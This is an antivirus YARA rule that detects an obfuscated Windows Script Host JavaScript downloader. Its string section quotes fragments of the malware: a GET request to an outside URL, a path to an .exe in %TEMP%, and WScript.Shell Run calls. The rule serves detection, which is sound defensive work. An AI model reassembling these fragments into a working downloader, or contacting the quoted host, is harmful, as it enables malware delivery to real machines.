rule sig_20160328_b53b00d0f77a31dacd884e63d8a49b28 {
  meta:
    description = "datamaliciousorder - file 20160328_b53b00d0f77a31dacd884e63d8a49b28.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "228ff644acb903513261f7b96d0f69c9dd70d1ac0c799f84238f6aafabad64ad"

  strings:
    $s1  = "function Adbdcco() {return Xeqxeag[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"SV6LzhJGoQpIITul.exe\";};" fullword ascii
    $s2  = "Olqslmozze[Wkkbyzzjo](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Fqnlankv](Whgcdcdnsn() * 11)} while (Olqslmozze[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Dqaxtdg(Ctjrdztl, Gslxg){return Ctjrdztl - Gslxg;};" fullword ascii
    $s5  = "var Xeqxeag = function Gdrjb() {return WScript[Chjwerxei](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Wikgcsp(Wyzyqhzkwg){Xeqxeag[\"Run\"](Wyzyqhzkwg, Hfjtusbzm, Hfjtusbzm);};" fullword ascii
    $s7  = "function Lfeeatck() {return ((Eloyo == true) && (Eloyo == Nzpfubt)) ? 1 : Hfjtusbzm;};" fullword ascii
    $s8  = "function Whgcdcdnsn(){return 22;};" fullword ascii
    $s9  = "Nzpfubt = true; " fullword ascii
    $s10 = "var Nzpfubt = false;" fullword ascii
    $s11 = " while (Zgnrrpezu){" fullword ascii
    $s12 = "function Xssvaeoeit(){return Chjwerxei;};" fullword ascii
    $s13 = "var Eloyo = false;" fullword ascii
    $s14 = "function Lulfwgm(Taiebmrmmb) {var Nevdjazeix = (1, 2, 3, 4, 5, Taiebmrmmb); return Nevdjazeix;};" fullword ascii
    $s15 = "var Wrzijblh = new this[\"Date\"]();" fullword ascii
    $s16 = "return Dqaxtdg(Ikmvc, Poiikrr);" fullword ascii
    $s17 = "function Eroabrpvvl()" fullword ascii
    $s18 = "var Hmyeacbae = false;" fullword ascii
    $s19 = "function Reomvwhuv(){return Khlhlf;};" fullword ascii
    $s20 = "Eloyo = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}